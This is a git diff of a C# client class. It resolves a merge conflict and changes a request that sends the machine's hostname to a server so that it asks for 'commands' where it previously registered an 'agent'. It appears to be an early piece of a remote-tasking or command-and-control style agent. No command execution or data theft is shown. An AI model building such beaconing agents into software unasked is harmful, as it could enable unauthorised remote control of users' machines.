@@ -105,21 +105,10 @@ namespace client
             // get commands from server
             // by commands I mean json from server on what to do
 
-<<<<<<< Updated upstream
-            // exact copy of register agent code for now
-            // TODO: verify how URL to interact is
-            try
-            {
-                // get machine hostname
-                string hostname = System.Environment.MachineName;
-                // build httpcontent body with hostname
-                string contentBody = $"{{\"hostname\": \"{hostname}\",\"command\": \"true\"}}";
-                HttpContent content = new StringContent(contentBody);
-=======
              // get machine hostname
             string hostname = System.Environment.MachineName;
             // build httpcontent body with hostname
-            string contentBody = $"{{\"hostname\": \"{hostname}\",\"register\": \"true\"}}";
+            string contentBody = $"{{\"hostname\": \"{hostname}\",\"command\": \"true\"}}";
             HttpContent content = new StringContent(contentBody);
             bool sent = await this.BuildAndSendHTTPRequest(content);
             if (sent) {
@@ -130,7 +119,6 @@ namespace client
             }
             
         }
->>>>>>> Stashed changes
 
         public async Task<bool> BuildAndSendHTTPRequest(HttpContent content)
         {
